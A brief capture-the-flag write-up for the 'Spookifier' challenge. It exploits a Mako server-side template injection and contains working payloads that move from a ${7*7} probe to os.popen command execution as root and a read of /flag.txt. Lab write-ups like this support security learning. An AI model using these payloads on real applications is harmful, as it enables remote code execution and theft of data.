# Spookifier CTF Writeup

## Table of Contents
1. [Introduction](#introduction)
2. [Challenge Description](#challenge-description)
3. [Solution](#solution)
    - [Step 1: Reconnaissance](#step-1-reconnaissance)
    - [Step 2: Exploitation](#step-2-exploitation)

## Introduction
There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

## Challenge Description
server is using python code and render template from user's input without santize or protected.

## Solution

### Step 1: Reconnaissance
```
http://host:port/?text=${7*7}
```
-> 49 -> `SSTI`

### Step 2: Exploitation
- Step 1
```
http://host:port/?text=${self.module.cache.util}
-> module 'mako.util' from '/usr/local/lib/python3.8/site-packages/mako/util.py'
```
- Step 2
```
http://host:port/?text=${self.module.cache.util.os.popen('id').read()}
-> uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
- step 3
```
http://host:port/?text=${self.module.cache.util.os.popen('cat+/flag.txt').read()}
-> HTB{....}
```

